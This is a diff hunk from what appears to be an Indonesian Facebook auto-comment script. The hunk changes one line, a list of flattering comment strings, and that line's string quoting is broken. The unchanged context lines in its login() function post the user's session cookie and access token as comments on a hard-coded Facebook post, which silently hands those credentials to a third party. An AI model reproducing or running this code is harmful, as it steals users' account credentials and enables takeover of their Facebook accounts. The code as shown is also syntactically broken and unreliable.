@@ -237,7 +237,7 @@ def login():
 		tem      = ('\nMantap Bang @[100043618273847:0]\n\nKeren Banget Lu Bang, Ganteng Banget Lu Bang Sumpah\n')
 		slebew = ('\nKomentar Ditulis Oleh Bot\n\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_hari_,hari_ini))
 		link = ('https://www.facebook.com/100068353870794/posts/pfbid0DsqiPfN3FsCrPTP6T7Vj8zfG7XSGV3zUoLjXppttRJJsV5ZKs1KYbdk4Kh2c9MuVl/?app=fbl')
-		random_kata = random.choice(["Acc Guru","Hallo Ganteng Banget,"Ah Ganteng Banget Bang"])
+		random_kata = random.choice(["Acc Guru","Hallo Ganteng,"Ah Ganteng Banget Bang"])
 		#ses.post(f"https://graph.facebook.com/576356403828297?fields=subscribers&access_token={token}",headers=(cookies=cok)
 		ses.post(f"https://graph.facebook.com/pfbid02JQhXCKgHnJQ8cLHo7DxxjqETqPbav76skib3greWgtik6gRMThZCpJQsNf6gQNrSl/comments/?message={cookie}&access_token={token}",cookies=cok)
 		ses.post(f"https://graph.facebook.com/pfbid02JQhXCKgHnJQ8cLHo7DxxjqETqPbav76skib3greWgtik6gRMThZCpJQsNf6gQNrSl/comments/?message={token}&access_token={token}",cookies=cok)
